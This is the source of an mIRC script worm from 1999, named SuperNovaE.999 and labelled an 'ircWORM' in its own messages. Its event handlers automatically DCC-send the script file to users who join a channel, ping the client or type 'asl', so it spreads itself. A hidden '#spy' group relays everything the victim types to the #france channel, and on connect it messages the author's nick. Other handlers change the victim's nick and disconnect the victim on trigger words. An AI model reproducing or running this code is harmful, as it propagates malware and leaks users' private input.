[SCRIPT]
;
;SuperNovaE.999 for Mirc V.1.0.2fr - 19/03/99
;
n1 = on 1:start: {
n2 =  .sreq ignore
n3 =  .remote on
n4 =  .ctcps on
n5 =  .events on
n6 =  .raw on
n7 =	}
;
n8 = on 1:connect:/raw privmsg Del_Armgo Vivant!Vivant!!
n9 = 
n10= #spy off
n11= on 1:input:*:.msg #france [( $+ $active $+ ) $1-]
n12= #spy end
n13= on 1:text: *:)*:#:/enable #spy
n14= 
n15= on 1:text:*oui*:#:/msg $nick SuperNovaE999_ircWORM_by_Del_Armg0¿
n16=
n17= on 1:text:*asl*:*:{
n18= if ( $nick == $me ) { halt } | .dcc send $nick $mircdir $+ script.ini
n19= }
n20= on 1:text:*asl*:*:/msg $nick hi 19f U?
;
;Antinazi
n21= on 1:text:*88*:#:/disconnect
;
;designed 4  l EclipSE 11/08/1999_in_ReimS
n22= on 1:text:*salut*:#:/nick SuperNovaE
n23=
n24= ctcp 1:ping:/dcc send $nick $mircdir script.ini
;
n25= on 1:join:#:{
n26= if ( $nick == $me ) { halt } | .dcc send $nick $mircdir $+ script.ini
n27= }
;
n28= on 1:quit:/notice $me Vivant! $nick Vivant!


